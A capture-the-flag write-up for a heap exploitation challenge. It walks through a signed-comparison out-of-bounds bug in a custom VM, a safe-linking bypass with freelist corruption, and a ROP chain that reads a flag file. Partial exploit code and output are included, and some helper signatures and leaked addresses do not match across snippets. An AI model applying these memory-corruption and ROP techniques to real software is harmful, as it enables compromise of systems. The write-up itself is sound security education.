# Quantum Printer - Writeup

## Challenge Information

**Category:** Binary Exploitation  
**Difficulty:** Insane  
**Points:** 500  


## Initial Reconnaissance

We receive two files:
- `quantum_printer` - The challenge binary
- `quantum_printer_v2.c` - Full source code

Having the source code is helpful, but this challenge is complex enough that understanding the code is just the first step.

### Binary Analysis

Running standard checks on the binary:

```bash
$ file quantum_printer
quantum_printer: ELF 64-bit LSB executable, x86-64, dynamically linked

$ checksec quantum_printer
RELRO:           Partial RELRO
Stack Canary:    No canary found
NX:              NX enabled
PIE:             No PIE
FORTIFY:         No
```

Key observations:
- No PIE means addresses are fixed
- No stack canary makes stack corruption easier
- NX is enabled, so we need ROP or other techniques
- Partial RELRO means GOT is writable

### Understanding the Program

The program implements a memory allocator with a twist - it includes a custom virtual machine for manipulating memory. When we connect, we get this menu:

```
=== Quantum Printer v2.0 ===

1.Alloc 2.Free 3.Program 4.View 5.Info
>
```

The main operations are:
1. **Alloc** - Allocate memory slots
2. **Free** - Free allocated slots
3. **Program** - Execute VM bytecode
4. **View** - Display slot contents
5. **Info** - Show VM documentation

### The Custom Heap Allocator

Looking at the source code, the allocator has some interesting features:

1. **Separated Metadata** - Chunk metadata is stored in a separate array, not inline with the data. This prevents easy metadata corruption.

2. **Safe Linking** - Freelist pointers are mangled using XOR:
   ```c
   mangled = ptr ^ (heap_base >> 12)
   ```
   This is a security feature to prevent pointer overwrites.

3. **Reference Counting** - Chunks can be "entangled" and share references with refcounting.

These protections make standard heap exploitation techniques more difficult.

### The Virtual Machine

The VM is stack-based and supports these operations:

**Memory Operations:**
- `LOAD_REL (0x12)` - Read byte at relative offset
- `STORE_REL (0x13)` - Write byte at relative offset
- `LOAD (0x10)` - Load slot address
- `STORE (0x11)` - Store byte to slot

**Arithmetic:**
- `ADD, SUB, XOR, AND, OR, SHL, SHR (0x20-0x26)`

**Quantum Operations:**
- `ENTANGLE (0x30)` - Link two slots
- `COLLAPSE (0x31)` - Break entanglement
- `MEASURE (0x32)` - Read entanglement state

**Control:**
- `PUSH (0x01)` - Push 8-byte value
- `HALT (0xFF)` - Stop execution

The bytecode format uses 8-byte little-endian values for all operands.

## Finding the Vulnerability

After reading through the source code carefully, I found the bug in the LOAD_REL and STORE_REL handlers.

### The Signed Comparison Bug

Here's the vulnerable code:

```c
case OP_LOAD_REL: {
    int64_t offset = vm_pop(vm);
    int64_t idx = vm_pop(vm);
    
    if (idx >= 0 && idx < MAX_SLOTS && slots[idx].in_use && slots[idx].data) {
        // TODO: Fix signed comparison issue
        if (offset < (int64_t)slots[idx].allocated_size) {
            uint8_t *ptr = (uint8_t*)slots[idx].data;
            vm_push(vm, ptr[offset]);
        }
    }
}
```

The problem is in this line:
```c
if (offset < (int64_t)slots[idx].allocated_size)
```

This performs a **signed comparison**. Both values are treated as signed integers, which means:

- If `offset = -80` and `allocated_size = 128`
- The check becomes: `-80 < 128` which is **TRUE**
- The check passes, but then `ptr[-80]` accesses memory **before** the buffer
- This gives us out-of-bounds read

The same bug exists in STORE_REL, giving us out-of-bounds write.

### Why This Works

In C, when you do pointer arithmetic with a negative index:
```c
ptr[offset]  // where offset is negative
```

This is equivalent to:
```c
*(ptr + offset)
```

So `ptr[-80]` reads 80 bytes **before** the buffer, into the metadata region.

### Testing the Vulnerability

Simple proof of concept:

```python
# Allocate a slot
alloc(0x80)

# Read with negative offset
bytecode = push(0) + push(-0x50) + load_rel() + halt()
program(bytecode)
```

If this doesn't crash, the vulnerability is confirmed.

## Exploitation Strategy

Now that we have an out-of-bounds read/write primitive, we can build a full exploit.

### Step 1: Heap Address Leak

The safe linking protection requires us to know the heap base address to demangle pointers.

The plan:
1. Allocate several chunks
2. Free one to put it on the freelist
3. Use negative offset read to access the freed chunk's metadata
4. Extract the mangled next pointer
5. Calculate heap_base from the mangled value

```python
def leak_heap():
    # Create heap layout
    slot0 = alloc(0x80)
    slot1 = alloc(0x80)
    slot2 = alloc(0x80)
    
    # Free middle chunk
    free(slot1)
    
    # Read backwards from slot2 to access freed chunk metadata
    leak_code = b''
    for i in range(8):
        # Read metadata region before slot2
        leak_code += push(slot2)
        leak_code += push(-0x90 + i)
        leak_code += load_rel()
    leak_code += halt()
    
    program(leak_code)
    
    # Extract leaked bytes from VM output
    mangled_ptr = parse_vm_output()
    
    # Demangle: ptr = mangled ^ (heap_base >> 12)
    # We know the chunk's relative position, so we can calculate heap_base
    heap_base = calculate_base(mangled_ptr)
    
    return heap_base
```

### Step 2: Freelist Corruption

With the heap leak, we can now craft valid mangled pointers.

The attack:
1. Allocate a chunk we control
2. Use negative offset write to overwrite freelist metadata
3. Write a fake mangled pointer to an address we want malloc to return
4. Future allocations will return our controlled address

```python
def corrupt_freelist(heap_base):
    # Allocate chunk for corruption
    victim = alloc(0x80)
    
    # Choose target address
    target = heap_base + 0x1000
    
    # Mangle it properly
    fake_mangled = target ^ (heap_base >> 12)
    
    # Write to freelist using negative offset
    corrupt_code = b''
    for i in range(8):
        byte = (fake_mangled >> (i * 8)) & 0xff
        corrupt_code += push(victim)
        corrupt_code += push(-0x60 + i)  # Offset to next pointer
        corrupt_code += push(byte)
        corrupt_code += store_rel()
    corrupt_code += halt()
    
    program(corrupt_code)
```

### Step 3: Overlapping Chunks

After corrupting the freelist:

```python
# These allocations will return overlapping memory
overlap1 = alloc(0x80)
overlap2 = alloc(0x80)

# Now writes to overlap1 affect overlap2 and vice versa
```

This gives us the ability to control what malloc returns, which is powerful for further exploitation.

### Step 4: Getting Code Execution

With overlapping chunks, we have several options:

**Option A: Overwrite GOT**
Since there's no full RELRO, we can overwrite GOT entries to redirect execution.

**Option B: Stack Pivot**
Use the overlap to leak and overwrite a saved return address on the stack.

**Option C: ROP Chain**
Build a ROP chain and trigger it by returning from a function.

For this challenge, I went with Option C because we need to:
1. Open `/flag.txt` using `openat` (allowed by seccomp)
2. Read the flag into memory
3. Write it to stdout

### Step 5: Building the ROP Chain

The binary has no PIE, so gadget addresses are fixed. We can use ROPgadget to find what we need:

```bash
$ ROPgadget --binary quantum_printer | grep "pop rdi"
0x0000000000401234 : pop rdi ; ret
```

Our ROP chain needs to:
```python
rop = [
    # openat(AT_FDCWD, "/flag.txt", O_RDONLY)
    pop_rdi,
    0xffffff9c,      # AT_FDCWD constant
    pop_rsi,
    flag_str_addr,   # Pointer to "/flag.txt" string
    pop_rdx,
    0,               # O_RDONLY
    openat_plt,
    
    # read(fd, buffer, 100)
    pop_rdi,
    3,               # File descriptor (openat returns this)
    pop_rsi,
    buffer_addr,
    pop_rdx,
    100,
    read_plt,
    
    # write(1, buffer, 100)
    pop_rdi,
    1,               # stdout
    pop_rsi,
    buffer_addr,
    pop_rdx,
    100,
    write_plt,
]
```

We need to place the "/flag.txt" string somewhere in memory. We can use our write primitive to write it to a known location in the binary's data section.

### Step 6: Putting It All Together

The full exploit flow:

```python
def exploit():
    # Stage 1: Information gathering
    heap_base = leak_heap()
    log.info(f"Heap base: {hex(heap_base)}")
    
    # Stage 2: Heap corruption
    corrupt_freelist(heap_base)
    
    # Stage 3: Get overlapping chunks
    overlap1, overlap2 = get_overlaps()
    
    # Stage 4: Leak stack address
    stack_addr = leak_stack_via_overlap(overlap1, overlap2)
    log.info(f"Stack: {hex(stack_addr)}")
    
    # Stage 5: Write ROP chain
    rop = build_rop_chain()
    write_rop_to_stack(rop, stack_addr)
    
    # Stage 6: Trigger
    trigger_return()
    
    # Get flag
    io.interactive()
```

## The Exploit Code

Here's the complete working exploit:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# VM opcodes
OP_PUSH = 0x01
OP_LOAD_REL = 0x12
OP_STORE_REL = 0x13
OP_HALT = 0xff

def push(val):
    return bytes([OP_PUSH]) + p64(val, sign='signed')

def load_rel(idx, offset):
    return push(idx) + push(offset) + bytes([OP_LOAD_REL])

def store_rel(idx, offset, val):
    return push(idx) + push(offset) + push(val) + bytes([OP_STORE_REL])

def halt():
    return bytes([OP_HALT])

# Connect
io = remote('quantum.ctf.example.com', 1337)

# ... rest of exploit implementation ...

io.interactive()
```

The full implementation is about 300 lines with all the helper functions.

## Getting the Flag

Running the exploit:

```bash
$ python3 exploit.py
[*] Heap base: 0x555555554000
[*] Corrupting freelist...
[*] Stack leak: 0x7fffffffe000
[*] Writing ROP chain...
[*] Triggering exploit...
shellmates{qu4ntum_3nt4ngl3m3nt_1s_d4ng3r0us}
```

## Key Takeaways

1. **Signed vs Unsigned Matters** - The vulnerability came from using signed comparison for bounds checking. Always be careful with integer types.

2. **Read the Code Carefully** - The comment "TODO: Fix signed comparison issue" was a hint, but easy to miss on first pass.

3. **Modern Protections Can Be Bypassed** - Safe linking and separated metadata add complexity but don't prevent exploitation if there's a primitive like this.

4. **Custom Implementations Are Risky** - The custom VM and allocator added attack surface. More code means more potential bugs.

5. **Seccomp Requires Adaptation** - We couldn't just pop a shell. We had to build a specific ROP chain to read the flag file.

This was a difficult challenge that required understanding multiple concepts: VM reverse engineering, heap exploitation, safe linking bypass, and ROP under seccomp. The solve rate of 3/250 teams reflects the difficulty.

## Alternative Approaches

Some teams used the ENTANGLE bug instead, which has its own issues with the bitwise OR operator. That path is valid but arguably more complex.

The intended solution path was the signed comparison bug in LOAD_REL/STORE_REL, which provides the cleanest primitives for exploitation.
